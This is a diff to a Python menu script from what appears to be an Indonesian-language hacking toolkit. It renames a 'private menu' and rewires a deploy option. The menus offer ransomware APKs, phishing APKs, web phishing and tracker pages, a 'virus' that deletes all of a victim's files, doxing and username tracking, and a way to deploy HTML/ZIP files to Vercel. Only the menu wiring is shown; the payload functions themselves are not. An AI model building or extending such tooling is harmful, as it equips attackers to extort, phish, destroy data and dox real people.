@@ -712,12 +712,12 @@ def multi_dox_menu():
     input(f"\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue")
     
     
-def private_menu():
+def KHUSUS_NEXULTZY():
     options2 = [
         {'num': 1, 'text': 'GET APK RANSOMWARE', 'func': GetRansom},
         {'num': 2, 'text': 'GET APK PHISING', 'func': GetPhising},
         {'num': 3, 'text': 'GET WEB PHISING/TRACKER', 'func': GetWebPhising},
-        {'num': 4, 'text': 'DEPLOY FILE HTML/ZIP', 'func': _run_vercel_cli_deploy},
+        {'num': 4, 'text': 'DEPLOY FILE HTML/ZIP', 'func': deploy_zip_to_vercel},  # ✅ pakai fungsi interaktif
         {'num': 5, 'text': 'GET VIRUS HAPUS ALL FILE KORBAN', 'func': GetVirus},
         {'num': 0, 'text': 'Kembali ke menu utama', 'func': lambda: None}
     ]
@@ -734,6 +734,7 @@ def private_menu():
                 if opt['num'] == choice:
                     if opt['num'] == 0:  # kalau pilih kembali
                         return
+                    # jalankan function sesuai menu
                     opt['func']()
                     found = True
                     break
@@ -781,7 +782,7 @@ options = [
     {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
     {'num': 5, 'text': 'WordPress Security Check (safe)', 'func': wp_security_menu},
     {'num': 6, 'text': 'Multi Doxing Intelligence (NEXULTZY)', 'func': multi_dox_menu},
-    {'num': 7, 'text': 'Private Menu', 'func': private_menu},   # ✅ diarahkan ke options2
+    {'num': 7, 'text': 'Private Menu', 'func': KHUSUS_NEXULTZY},   # ✅ diarahkan ke options2
     {'num': 0, 'text': 'Exit', 'func': exit}
 ]
 
